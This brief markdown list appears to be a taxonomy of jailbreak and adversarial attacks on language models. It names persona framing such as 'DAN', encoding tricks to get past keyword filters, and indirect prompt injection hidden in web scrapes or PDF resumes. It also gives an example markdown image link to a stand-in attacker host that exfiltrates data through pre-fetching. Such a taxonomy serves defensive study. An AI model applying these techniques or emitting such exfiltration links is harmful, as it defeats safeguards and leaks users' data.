# Jailbreak & Adversarial Attack Taxonomy

1. **Roleplay / Persona Framing**: Forcing the LLM into an unrestricted persona ("DAN", "EvilAI") that ignores safety filters.
2. **Context Smuggling & Encoding**: Base64, ROT13, or foreign language encoding to bypass simple keyword blocklists.
3. **Indirect Prompt Injection**: Hiding invisible zero-width characters or HTML comments inside web scrapes or PDF resumes.
4. **Markdown Exfiltration**: Tricking the LLM into outputting `![status](https://evil.com/leak?data=...)` to cause image pre-fetching.
